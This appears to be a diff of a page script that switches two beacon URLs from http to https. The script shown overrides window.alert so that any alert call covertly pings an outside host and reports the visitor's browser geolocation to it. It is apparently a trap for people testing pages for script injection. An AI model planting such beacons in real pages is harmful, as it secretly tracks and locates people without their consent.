@@ -4,14 +4,14 @@
 <script>
 function showPosition(position) {
     img = new Image();
-    img.src = "http://hb.lanmaster53.com/api/beacon/0783387c-34f6-45ce-be7e-6a951bd93728/JavaScript?lat=" + position.coords.latitude + "&lng=" + position.coords.longitude + "&acc=" + position.coords.accuracy;
+    img.src = "https://hb.lanmaster53.com/api/beacon/0783387c-34f6-45ce-be7e-6a951bd93728/JavaScript?lat=" + position.coords.latitude + "&lng=" + position.coords.longitude + "&acc=" + position.coords.accuracy;
 }
 // fun stuff
 var _alert = window.alert;
 window.alert = function(msg) {
     // HTML agent
     img = new Image();
-    img.src = "http://hb.lanmaster53.com/api/beacon/0783387c-34f6-45ce-be7e-6a951bd93728/HTML";
+    img.src = "https://hb.lanmaster53.com/api/beacon/0783387c-34f6-45ce-be7e-6a951bd93728/HTML";
     // JavaScript agent
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(showPosition);
